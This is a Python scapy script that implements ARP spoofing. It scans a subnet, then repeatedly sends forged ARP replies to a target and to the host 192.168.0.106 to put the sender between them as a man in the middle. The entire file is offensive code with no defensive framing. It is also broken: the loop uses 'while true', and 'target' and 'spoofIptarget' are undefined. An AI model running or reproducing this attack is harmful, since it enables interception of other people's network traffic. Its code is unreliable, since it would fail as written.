import scapy.all as scapy
import optparse
import time


def getArgs() :
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target/IP - IP range")
    (options, arguments) = parser.parse_args()
    return options


def findIP(ip) :
    # create a request object and send general arp request  
    arp_request = scapy.ARP(pdst=ip) 
    
    # using the bradcast mac address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_request
    
    # show the information about the packet
    print(f"\n################ arp packet #########################")
    arp_broadcast.show()
    
    # send and receive packet
    answered_list = scapy.srp(arp_broadcast, timeout=1)[0]
    
    # print the data 
    print(f"\n################ Arp response ########################")
    target_list = []
    for data in answered_list:
        print(data[1].show())
        target_list.append({"ip": data[1].pdst, "hwdst": data[1].hwdst})

    return target_list
 
def getMac(ip) :
    # create a request object and send general arp request  
    arp_request = scapy.ARP(pdst=ip) 
    
    # using the bradcast mac address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_request
    
    # show the information about the packet
    print(f"\n################ arp packet #########################")
    arp_broadcast.show()
    
    # send and receive packet
    answered_list = scapy.srp(arp_broadcast, timeout=1)[0]
    return answered_list[1].hwsrc


def spoofTarget(targetip, spoofIP) :
    target_mac = getMac(targetip)
    packet = scapy.ARP(op=2, pdst=target["ip"], hwdst=target_mac, psrc=spoofIP)
    print(packet.show())

    scapy.send(packet)
    

options = getArgs()
result_dict = findIP(options.target)

while true:
    spoofTarget(result_dict[0], "192.168.0.106")
    spoofIptarget("192.168.0.106", result_dict[0]["ip"])
    time.sleep(2)
